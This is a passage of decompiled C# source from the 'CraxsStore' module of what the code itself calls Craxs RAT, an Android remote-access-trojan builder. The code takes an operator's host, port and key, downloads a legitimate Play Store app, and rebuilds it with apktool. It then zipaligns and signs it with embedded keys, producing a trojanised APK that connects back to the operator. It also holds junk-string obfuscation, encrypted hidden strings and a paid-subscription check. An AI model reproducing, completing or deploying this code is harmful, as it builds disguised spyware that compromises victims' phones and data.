		// (set) Token: 0x060002F3 RID: 755 RVA: 0x000183D4 File Offset: 0x000165D4
		internal virtual DrakeUICheckBox checkDraw { get; set; }

		// Token: 0x1700011E RID: 286
		// (get) Token: 0x060002F4 RID: 756 RVA: 0x000026A7 File Offset: 0x000008A7
		// (set) Token: 0x060002F5 RID: 757 RVA: 0x000183E8 File Offset: 0x000165E8
		internal virtual DrakeUICheckBox checkautoclick { get; set; }

		// Token: 0x1700011F RID: 287
		// (get) Token: 0x060002F6 RID: 758 RVA: 0x000026AF File Offset: 0x000008AF
		// (set) Token: 0x060002F7 RID: 759 RVA: 0x000183FC File Offset: 0x000165FC
		internal virtual DrakeUICheckBox checksuper { get; set; }

		// Token: 0x060002F8 RID: 760 RVA: 0x00018410 File Offset: 0x00016610
		public void method_0(object[] objects_0)
		{
			if (this.DGVSTORE.InvokeRequired)
			{
				this.DGVSTORE.Invoke(new CraxsStore.GDelegate0(this.method_0), new object[]
				{
					objects_0
				});
			}
			else
			{
				string[] array = objects_0[0].ToString().Split(new char[]
				{
					':'
				});
				string str = array[0];
				string text = array[1];
				string text2 = array[2];
				string text3 = array[3];
				string text4 = array[4];
				string text5 = array[5];
				string text6 = array[6];
				string text7 = array[7];
				string text8 = array[8];
				int index = this.DGVSTORE.Rows.Add(new object[]
				{
					Module2.smethod_38(Module2.smethod_36(text4 + "/" + str), new Size(45, 45), false),
					text,
					text2,
					text3,
					text4,
					text5,
					false
				});
				this.DGVSTORE.Rows[index].Tag = new string[]
				{
					text6,
					text7,
					text8,
					text4
				};
			}
		}

		// Token: 0x060002F9 RID: 761 RVA: 0x00018524 File Offset: 0x00016724
		private void CraxsStore_Load(object sender, EventArgs e)
		{
			this.ComboPrims.Text = "Only Needed";
			XmlDocument xmlDocument = new XmlDocument();
			try
			{
				xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
			}
			catch (Exception)
			{
			}
			this.strpasstext.Text = Module4.smethod_5();
			this.lockpanel.BringToFront();
			this.storebtn.Enabled = false;
			this.reqbtn.Enabled = false;
			this.exitbtn.Enabled = false;
			try
			{
				this.CLiname.Text = MySettingsProperty.Settings.inj_tnam;
				this.Host.Text = MySettingsProperty.Settings.inj_thost;
				this.Port.Text = MySettingsProperty.Settings.inj_tport;
				this.TheKey.Text = MySettingsProperty.Settings.inj_tkey;
			}
			catch (Exception)
			{
				this.CLiname.Text = "Client1";
				this.Host.Text = "...";
				this.Port.Text = "7771";
				this.TheKey.Text = "TxTxT";
			}
			this.lockpanel.Visible = true;
		}

		// Token: 0x060002FA RID: 762 RVA: 0x00018678 File Offset: 0x00016878
		private void Timer1_Tick(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.statustext.Text, "...", false) == 0)
			{
				this.statustext.Text = "";
			}
			if (!(this.statustext.Text.Length < this.string_0.Length & !this.bool_0))
			{
				if (!this.bool_0)
				{
					this.bool_0 = true;
					this.statustext.Text = "";
					if (!this.loadworker.IsBusy)
					{
						this.loadworker.RunWorkerAsync();
					}
				}
				if (!(this.statustext.Text.Length < this.string_1.Length & !this.bool_1))
				{
					if (!this.bool_2)
					{
						if (this.bool_3)
						{
							this.Timer1.Stop();
							if (Module2.smethod_30("Connection error 2", "Can't connect to server please try again later", false))
							{
								this.reqbtn.Enabled = true;
							}
						}
						else
						{
							this.statustext.Text = this.statustext.Text.Replace(".", "");
						}
					}
					else
					{
						this.storebtn.Enabled = true;
						this.reqbtn.Enabled = true;
						this.exitbtn.Enabled = true;
						this.bool_1 = true;
						this.Timer1.Stop();
						this.statustext.Text = "";
					}
				}
				else
				{
					Label statustext;
					(statustext = this.statustext).Text = statustext.Text + Conversions.ToString(this.string_1[this.statustext.Text.Length]);
				}
			}
			else
			{
				Label statustext;
				(statustext = this.statustext).Text = statustext.Text + Conversions.ToString(this.string_0[this.statustext.Text.Length]);
			}
		}

		// Token: 0x060002FB RID: 763 RVA: 0x00011540 File Offset: 0x0000F740
		private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x060002FC RID: 764 RVA: 0x0001886C File Offset: 0x00016A6C
		private void DrakeUIButtonIcon13_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x060002FD RID: 765 RVA: 0x00018880 File Offset: 0x00016A80
		private void loadworker_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				string[] array = Module2.smethod_32();
				if (array != null)
				{
					if (Operators.CompareString(array[0], "Error", false) != 0)
					{
						foreach (string text in array)
						{
							try
							{
								if (text.Length > 0)
								{
									this.method_0(new object[]
									{
										Module2.smethod_58(text, "Theme")
									});
								}
							}
							catch (Exception ex)
							{
							}
						}
						this.bool_2 = true;
					}
					else
					{
						this.bool_3 = true;
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x060002FE RID: 766 RVA: 0x0001893C File Offset: 0x00016B3C
		private void Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Module2.ReleaseCapture();
				Module2.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060002FF RID: 767 RVA: 0x00011540 File Offset: 0x0000F740
		private void exitbtn_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000300 RID: 768 RVA: 0x00018974 File Offset: 0x00016B74
		private void storebtn_Click(object sender, EventArgs e)
		{
			this.Panelhome.SendToBack();
			this.mainpanel.BringToFront();
		}

		// Token: 0x06000301 RID: 769 RVA: 0x00018998 File Offset: 0x00016B98
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			this.mainpanel.SendToBack();
			this.Panelhome.BringToFront();
		}

		// Token: 0x06000302 RID: 770 RVA: 0x000189BC File Offset: 0x00016BBC
		private void reqbtn_Click(object sender, EventArgs e)
		{
			requestapk requestapk = new requestapk();
			requestapk.ShowDialog(this);
		}

		// Token: 0x06000303 RID: 771 RVA: 0x000189D8 File Offset: 0x00016BD8
		private void method_11(object sender, EventArgs e)
		{
			try
			{
				if (this.DGVSTORE.Rows.Count > 0 && this.DGVSTORE.SelectedRows.Count > 0)
				{
					string[] array = (string[])this.DGVSTORE.SelectedRows[0].Tag;
					Process.Start(array[2]);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000304 RID: 772 RVA: 0x00018A58 File Offset: 0x00016C58
		public void method_12(object[] objects_0)
		{
			if (this.worklog.InvokeRequired)
			{
				CraxsStore.GDelegate1 method = new CraxsStore.GDelegate1(this.method_12);
				this.worklog.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				try
				{
					this.worklog.AppendText(objects_0[0].ToString());
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000305 RID: 773 RVA: 0x00018ACC File Offset: 0x00016CCC
		public void method_13(string string_0)
		{
			try
			{
				this.method_12(new object[]
				{
					string_0 + "\r\n"
				});
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000306 RID: 774 RVA: 0x00018B14 File Offset: 0x00016D14
		public void method_14(object[] objects_0)
		{
			if (!this.statustext.InvokeRequired)
			{
				try
				{
					this.statustext.Text = objects_0[0].ToString();
					return;
				}
				catch (Exception ex)
				{
					return;
				}
			}
			CraxsStore.GDelegate2 method = new CraxsStore.GDelegate2(this.method_14);
			this.statustext.Invoke(method, new object[]
			{
				objects_0
			});
		}

		// Token: 0x06000307 RID: 775 RVA: 0x00018B88 File Offset: 0x00016D88
		public void method_15(string string_0)
		{
			try
			{
				this.method_14(new object[]
				{
					string_0 + "\r\n"
				});
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000308 RID: 776 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_16(object sender, EventArgs e)
		{
		}

		// Token: 0x06000309 RID: 777 RVA: 0x00018BD0 File Offset: 0x00016DD0
		private void method_17(object sender, EventArgs e)
		{
			try
			{
				if (this.DGVSTORE.Rows.Count > 0 && this.DGVSTORE.SelectedRows.Count > 0)
				{
					string[] array = (string[])this.DGVSTORE.SelectedRows[0].Tag;
					Process.Start("https://play.google.com/store/apps/details?id=" + array[3]);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600030A RID: 778 RVA: 0x00018C58 File Offset: 0x00016E58
		private void method_18(object sender, UploadValuesCompletedEventArgs e)
		{
			Module2.smethod_30("Download", "Apk Download finished", false);
			this.method_13("Download complete");
			this.downprogress.Value = 0;
			this.method_15(" ");
		}

		// Token: 0x0600030B RID: 779 RVA: 0x00018C98 File Offset: 0x00016E98
		private void method_19(object sender, UploadProgressChangedEventArgs e)
		{
			try
			{
				this.downprogress.Value = e.ProgressPercentage;
				this.method_15(e.ProgressPercentage.ToString() + "%");
				Application.DoEvents();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600030C RID: 780 RVA: 0x00018CFC File Offset: 0x00016EFC
		public object method_20(int int_3, int int_4)
		{
			string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
			if (this.staticLocalInitFlag_0 == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.staticLocalInitFlag_0, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this.staticLocalInitFlag_0, ref flag);
				if (this.staticLocalInitFlag_0.State != 0)
				{
					if (this.staticLocalInitFlag_0.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				else
				{
					this.staticLocalInitFlag_0.State = 2;
					this.random_1 = new Random();
				}
			}
			finally
			{
				this.staticLocalInitFlag_0.State = 1;
				if (flag)
				{
					Monitor.Exit(this.staticLocalInitFlag_0);
				}
			}
			int num = this.random_1.Next(int_3, int_4);
			StringBuilder stringBuilder = new StringBuilder();
			int num2 = num;
			checked
			{
				for (int i = 1; i <= num2; i++)
				{
					int startIndex = this.random_1.Next(0, text.Length);
					stringBuilder.Append(text.Substring(startIndex, 1));
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x0600030D RID: 781 RVA: 0x00018DF8 File Offset: 0x00016FF8
		public object method_21(int int_3, int int_4)
		{
			string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
			if (this.staticLocalInitFlag_1 == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.staticLocalInitFlag_1, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this.staticLocalInitFlag_1, ref flag);
				if (this.staticLocalInitFlag_1.State == 0)
				{
					this.staticLocalInitFlag_1.State = 2;
					this.random_2 = new Random();
				}
				else if (this.staticLocalInitFlag_1.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				this.staticLocalInitFlag_1.State = 1;
				if (flag)
				{
					Monitor.Exit(this.staticLocalInitFlag_1);
				}
			}
			int num = this.random_2.Next(int_3, int_4);
			StringBuilder stringBuilder = new StringBuilder();
			int num2 = num;
			checked
			{
				for (int i = 1; i <= num2; i++)
				{
					int startIndex = this.random_2.Next(0, text.Length);
					stringBuilder.Append(text.Substring(startIndex, 1));
				}
				ref int ptr = ref this.int_0;
				this.int_0 = ptr + 1;
				return stringBuilder.ToString() + Conversions.ToString(this.int_0);
			}
		}

		// Token: 0x0600030E RID: 782 RVA: 0x00018F14 File Offset: 0x00017114
		private int method_22(int int_3, int int_4)
		{
			if (this.staticLocalInitFlag_2 == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.staticLocalInitFlag_2, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this.staticLocalInitFlag_2, ref flag);
				if (this.staticLocalInitFlag_2.State != 0)
				{
					if (this.staticLocalInitFlag_2.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				else
				{
					this.staticLocalInitFlag_2.State = 2;
					this.random_3 = new Random();
				}
			}
			finally
			{
				this.staticLocalInitFlag_2.State = 1;
				if (flag)
				{
					Monitor.Exit(this.staticLocalInitFlag_2);
				}
			}
			return this.random_3.Next(int_3, int_4);
		}

		// Token: 0x0600030F RID: 783 RVA: 0x00018FC0 File Offset: 0x000171C0
		private void downloadworker_DoWork(object sender, DoWorkEventArgs e)
		{
			CraxsStore.Class6 @class = new CraxsStore.Class6();
			@class.craxsStore_0 = this;
			@class.object_0 = sender;
			@class.doWorkEventArgs_0 = e;
			@class.int_0 = -1;
			@class.asyncVoidMethodBuilder_0 = AsyncVoidMethodBuilder.Create();
			@class.asyncVoidMethodBuilder_0.Start<CraxsStore.Class6>(ref @class);
		}

		// Token: 0x06000310 RID: 784 RVA: 0x00019008 File Offset: 0x00017208
		public void Process_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			try
			{
				if (!base.InvokeRequired)
				{
					if (!string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null))))
					{
						if (!this.bool_4 && NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().StartsWith("I:"))
						{
							string text = NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString();
							this.method_13(text.Replace("I:", ""));
						}
						Thread.Sleep(1);
						string text2 = "temp";
						if (NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar SignApk.jar") | NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar " + this.string_39 + "\\SignApk.jar "))
						{
							Module2.smethod_30("finish", "app build", false);
							this.method_13("Finish");
							Process.Start(Module8.string_3 + "\\Downloads");
							base.Close();
						}
						else if (!NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().Contains("java -version"))
						{
							if (NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null).ToString().Contains("Built apk"))
							{
								for (;;)
								{
									if (!File.Exists(string.Concat(new string[]
									{
										this.string_39,
										"\\",
										text2,
										"\\dist\\",
										text2,
										".apk"
									})))
									{
										Thread.Sleep(5000);
									}
									else
									{
										if (this.bool_5)
										{
											break;
										}
										if (!this.bool_5)
										{
											NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
											{
												string.Concat(new string[]
												{
													"zipalign.exe -v 4 ",
													this.string_39,
													"\\",
													text2,
													"\\dist\\",
													text2,
													".apk ",
													this.string_39,
													"\\",
													text2,
													"\\dist\\",
													text2,
													"zip.apk "
												})
											}, null, null, null, true);
											this.method_13(" Verification...");
											this.bool_5 = true;
										}
										Thread.Sleep(5000);
									}
								}
								this.method_13("Apk Signing...");
								File.Delete(this.string_39 + "\\certificate.pem");
								File.Delete(this.string_39 + "\\key.pk8");
								File.WriteAllBytes(this.string_39 + "\\certificate.pem", Module0.c);
								File.WriteAllBytes(this.string_39 + "\\key.pk8", Module0.k);
								try
								{
									if (!Directory.Exists(Module8.string_3 + "\\Downloads"))
									{
										Directory.CreateDirectory(Module8.string_3 + "\\Downloads");
									}
								}
								catch (Exception ex)
								{
								}
								NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
								{
									string.Concat(new string[]
									{
										"java -jar ",
										this.string_39,
										"\\SignApk.jar sign --key ",
										this.string_39,
										"\\key.pk8 --cert ",
										this.string_39,
										"\\certificate.pem  --v2-signing-enabled true --v3-signing-enabled true --out \"",
										Module8.string_3,
										"\\Downloads\\",
										this.string_37.Replace(" ", ""),
										".apk\" \"",
										this.string_39,
										"\\",
										text2,
										"\\dist\\",
										text2,
										".apk\""
									})
								}, null, null, null, true);
								this.bool_4 = true;
							}
						}
						else
						{
							NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
							{
								string.Concat(new string[]
								{
									"apktool b -f -o \"",
									this.string_39,
									"\\",
									text2,
									"\\dist\\",
									text2,
									".apk\" \"",
									this.string_38,
									"\""
								})
							}, null, null, null, true);
						}
					}
				}
				else
				{
					CraxsStore.GDelegate3 method = new CraxsStore.GDelegate3(this.Process_OutputDataReceived);
					base.Invoke(method, new object[]
					{
						sender,
						e
					});
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000311 RID: 785 RVA: 0x00019544 File Offset: 0x00017744
		private void method_25()
		{
			try
			{
				this.method_28();
			}
			catch (Exception ex)
			{
			}
			finally
			{
			}
		}

		// Token: 0x06000312 RID: 786 RVA: 0x00019588 File Offset: 0x00017788
		public string method_26()
		{
			return Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(this.method_21(400, 1000), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), this.method_27(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), this.method_21(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), this.method_27(400, 1000)));
		}

		// Token: 0x06000313 RID: 787 RVA: 0x0001960C File Offset: 0x0001780C
		public object method_27(int int_3, int int_4)
		{
			string text = "诶杰艾诶比伊哦诶诶娜西艾哦吉娜ثشقلسيقفالاسفلىسغ弗艾吉乃モ匕丹丹ち匚下尺ˉˏʾˎᵔٴיﹶﾞˋˈⁱـˎˋˋʿˎʿʿﹶˉˋᴵʻʼˑᵢʾʻʾᴵʿᵢʾᵢﹳʾᴵיˉᵎʼﹳʾʾᵢˆʽˎʿˊʾˈᵔʽᵎʼיⁱʾᐧﹶיˋˏᵎˋٴˈˑٴʻᵔˎʻˎʼˑᵢʾʻʾᴵʿיʼᐧˑʼˈˈיـˏᵢـٴˎʿˆʻˏʿᵎﾞˏﹶˎﹳʾʿˋᵢـʿᴵٴˎﾞˏٴٴᵎᵎٴᐧʾﹶٴـٴᵔˎᵢᵢᵔיᵔˏ匕尺عنبغعناتىةىاعخل下ㄚ工ㄥ∪工Ｊれ尺匕卄ちム下∨";
			if (this.random_0 == null)
			{
				this.random_0 = new Random();
			}
			string text2 = "";
			checked
			{
				while (text2.Length < int_3)
				{
					text2 += Conversions.ToString(text[this.random_0.Next(0, text.Length - 1)]);
				}
				ref int ptr = ref this.int_1;
				this.int_1 = ptr + 1;
				return text2.ToString().ToLower() + Conversions.ToString(this.int_1);
			}
		}

		// Token: 0x06000314 RID: 788 RVA: 0x0001969C File Offset: 0x0001789C
		private void method_28()
		{
			try
			{
				Application.ExitThread();
				NewLateBinding.LateCall(this.process_0, null, "CancelOutputRead", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "CancelErrorRead", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "Kill", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "Close", new object[0], null, null, null, true);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000315 RID: 789 RVA: 0x00019740 File Offset: 0x00017940
		private bool method_29()
		{
			bool result;
			try
			{
				this.process_0 = new Process();
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardOutput", new object[]
				{
					true
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardInput", new object[]
				{
					true
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardError", new object[]
				{
					true
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "FileName", new object[]
				{
					"cmd.exe"
				}, null, null, false, true);
				((Process)this.process_0).OutputDataReceived += this.Process_OutputDataReceived;
				((Process)this.process_0).ErrorDataReceived += this.Process_OutputDataReceived;
				((Process)this.process_0).Exited += this.Process_Exited;
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "UseShellExecute", new object[]
				{
					false
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "CreateNoWindow", new object[]
				{
					true
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.process_0, null, "StartInfo", new object[0], null, null, null), null, "WindowStyle", new object[]
				{
					ProcessWindowStyle.Hidden
				}, null, null, false, true);
				NewLateBinding.LateSet(this.process_0, null, "EnableRaisingEvents", new object[]
				{
					true
				}, null, null);
				NewLateBinding.LateCall(this.process_0, null, "Start", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "BeginOutputReadLine", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "BeginErrorReadLine", new object[0], null, null, null, true);
				result = true;
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000316 RID: 790 RVA: 0x000199DC File Offset: 0x00017BDC
		public static void smethod_0(string string_40)
		{
			string[] files = Directory.GetFiles(string_40);
			string[] directories = Directory.GetDirectories(string_40);
			foreach (string path in files)
			{
				File.SetAttributes(path, FileAttributes.Normal);
				File.Delete(path);
			}
			foreach (string text in directories)
			{
				CraxsStore.smethod_0(text);
			}
			Directory.Delete(string_40, false);
		}

		// Token: 0x06000317 RID: 791 RVA: 0x00019A50 File Offset: 0x00017C50
		public string method_30()
		{
			string result;
			try
			{
				string[] separator = new string[]
				{
					"\\"
				};
				string[] array = Application.StartupPath.Split(separator, StringSplitOptions.RemoveEmptyEntries);
				result = array[0].ToString() + "\\";
			}
			catch (Exception ex)
			{
				result = "C:\\";
			}
			return result;
		}

		// Token: 0x06000318 RID: 792 RVA: 0x00019AB4 File Offset: 0x00017CB4
		private string method_31(string string_0)
		{
			return Encoding.UTF8.GetString(Convert.FromBase64String(string_0));
		}

		// Token: 0x06000319 RID: 793 RVA: 0x00019AD4 File Offset: 0x00017CD4
		public string method_32(string string_0, string string_1)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = new byte[32];
			byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_1));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(string_0);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
		}

		// Token: 0x0600031A RID: 794 RVA: 0x00019B64 File Offset: 0x00017D64
		private void method_33(object sender, EventArgs e)
		{
			this.workpanel.SendToBack();
			this.showworkbtn.Visible = true;
		}

		// Token: 0x0600031B RID: 795 RVA: 0x00011540 File Offset: 0x0000F740
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0600031C RID: 796 RVA: 0x00019B88 File Offset: 0x00017D88
		private void b_ok_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.strpasstext.Text) | string.IsNullOrWhiteSpace(this.strpasstext.Text))
			{
				Module2.smethod_30("Enter Password", "Enter Password to Login", false);
			}
			else
			{
				try
				{
					this.method_32(this.strpasstext.Text, "Exception");
				}
				catch (Exception ex)
				{
					Module2.smethod_30("incorrect Password", "this password is not valid", false);
					return;
				}
				try
				{
					string[] array = Module2.smethod_34(this.strpasstext.Text);
					string left = array[0];
					if (Operators.CompareString(left, "C", false) != 0)
					{
						if (Operators.CompareString(left, "B", false) != 0)
						{
							Module2.smethod_30("Connection error 45", "Can't connect to server please try again later", false);
						}
						else
						{
							Module2.smethod_30("Purchase", "Upgrade your license to access Craxs Store  Craxsrat.net", false);
						}
					}
					else
					{
						string[] array2 = this.method_32(array[1], "Exception").Split(new char[]
						{
							'>'
						});
						string s = array2[1];
						try
						{
							object obj = new CultureInfo("en-US");
							DateTime dateTime = DateTime.Parse(s, (IFormatProvider)obj);
							string s2 = Module2.smethod_35();
							if (DateTime.Compare(dateTime.AddDays(30.0), DateTime.Parse(s2, (IFormatProvider)obj)) >= 0)
							{
								if (Module2.smethod_30("Success", "Welcome to Craxs Store  login Days left: " + (dateTime.AddDays(30.0).Date - DateTime.Parse(s2, (IFormatProvider)obj).Date).TotalDays.ToString(), false))
								{
									Module4.smethod_6(this.strpasstext.Text);
									this.Panelhome.BringToFront();
									this.lockpanel.SendToBack();
									this.Timer1.Start();
								}
							}
							else
							{
								Module2.smethod_30("Subscription Ended", "Days left: 0  Reactivate store at craxsrat.net", false);
							}
						}
						catch (Exception ex2)
						{
							Module2.smethod_30("Connection error 79", ex2.Message, false);
						}
					}
				}
				catch (Exception ex3)
				{
					Module2.smethod_30("Connection error 75", "Can't connect to server please try again later", false);
				}
			}
		}

		// Token: 0x0600031D RID: 797 RVA: 0x00019E0C File Offset: 0x0001800C
		private void showworkbtn_Click(object sender, EventArgs e)
		{
			this.workpanel.BringToFront();
		}

		// Token: 0x0600031E RID: 798 RVA: 0x00019E24 File Offset: 0x00018024
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(Module8.string_3 + "\\Downloads"))
				{
					Directory.CreateDirectory(Module8.string_3 + "\\Downloads");
				}
				Process.Start(Module8.string_3 + "\\Downloads");
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600031F RID: 799 RVA: 0x00019E98 File Offset: 0x00018098
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			if (!(string.IsNullOrEmpty(this.Host.Text) | string.IsNullOrWhiteSpace(this.Host.Text)))
			{
				if (!(string.IsNullOrEmpty(this.Port.Text) | string.IsNullOrWhiteSpace(this.Port.Text)))
				{
					if (string.IsNullOrEmpty(this.TheKey.Text) | string.IsNullOrWhiteSpace(this.TheKey.Text))
					{
						Module2.smethod_30("Complete info", "Please enter Key first.", false);
						return;
					}
					if (!Module2.smethod_30("Check", string.Concat(new string[]
					{
						"Confirm?  Host: ",
						this.Host.Text,
						"   Port: ",
						this.Port.Text,
						"   Key:",
						this.TheKey.Text
					}), true))
					{
						return;
					}
					try
					{
						if (this.DGVSTORE.SelectedRows.Count <= 0)
						{
							Module2.smethod_30("complete info", "Select apk from store", false);
							return;
						}
						if (this.downloadworker.IsBusy)
						{
							Module2.smethod_30("Downlaod working", "Wait for download to finish", false);
							return;
						}
						string[] array = (string[])this.DGVSTORE.SelectedRows[0].Tag;
						List<string> list = new List<string>();
						list.Add(array[0]);
						list.Add(array[1]);
						list.Add(array[2]);
						list.Add(array[3]);
						list.Add(this.ComboPrims.Text);
						list.Add((string)this.DGVSTORE.SelectedRows[0].Cells[1].Value);
						this.workimage.Image = (Image)this.DGVSTORE.SelectedRows[0].Cells[0].Value;
						this.worklabel.Text = string.Concat(new string[]
						{
							(string)this.DGVSTORE.SelectedRows[0].Cells[1].Value,
							"   ",
							(string)this.DGVSTORE.SelectedRows[0].Cells[2].Value,
							"   ",
							(string)this.DGVSTORE.SelectedRows[0].Cells[4].Value
						});
						this.worklog.Text = "";
						this.downloadworker.RunWorkerAsync(list);
						this.workpanel.BringToFront();
						return;
					}
					catch (Exception ex)
					{
						Module2.smethod_30("Connection error 2", "Can't connect to server please try again later", false);
						return;
					}
				}
				Module2.smethod_30("Complete info", "Please enter port first.", false);
			}
			else
			{
				Module2.smethod_30("Complete info", "Please enter Host or ip first.", false);
			}
		}

		// Token: 0x06000320 RID: 800 RVA: 0x0001A1C0 File Offset: 0x000183C0
		private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
		{
			try
			{
				if (Module2.smethod_30(this.method_32("akFzmqDQJzqmAe4q2R4qEQ==", "cameramanager"), this.method_32("u3761jA987VGWm7EmtpRLeelKohAd5KHo4yOIKHVNpT7mEVqg55GScpI0AsD9/h4lVzEyc2kYZdY\r\npIy5R0m1Ang2iTmSozQhV0OXHd7UtLM=", "BringToFront"), true))
				{
					Process.Start(this.method_32("AfMdfgfTCG3fswubvIb1hJvGvTc5x/tGPN1F2dY358w=", "res/config"));
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000321 RID: 801 RVA: 0x0001A22C File Offset: 0x0001842C
		private void DGVSTORE_CellClick(object sender, DataGridViewCellEventArgs e)
		{
			checked
			{
				if (this.DGVSTORE.SelectedRows.Count > 0)
				{
					int num = this.DGVSTORE.Rows.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						try
						{
							if (Operators.ConditionalCompareObjectEqual(this.DGVSTORE.Rows[i].Cells[6].Value, true, false))
							{
								this.DGVSTORE.Rows[i].Cells[6].Value = false;
							}
						}
						catch (Exception ex)
						{
						}
					}
					this.DGVSTORE.SelectedRows[0].Cells[6].Value = true;
				}
			}
		}

		// Token: 0x06000322 RID: 802 RVA: 0x000026B7 File Offset: 0x000008B7
		[CompilerGenerated]
		private void Process_Exited(object sender, EventArgs e)
		{
			this.method_25();
		}

		// Token: 0x040000E8 RID: 232
		public string string_0;

		// Token: 0x040000E9 RID: 233
		public string string_1;

		// Token: 0x040000EA RID: 234
		public bool bool_0;

		// Token: 0x040000EB RID: 235
		public bool bool_1;

		// Token: 0x040000EC RID: 236
		public bool bool_2;

		// Token: 0x040000ED RID: 237
		public bool bool_3;

		// Token: 0x040000EE RID: 238
		public object object_0;

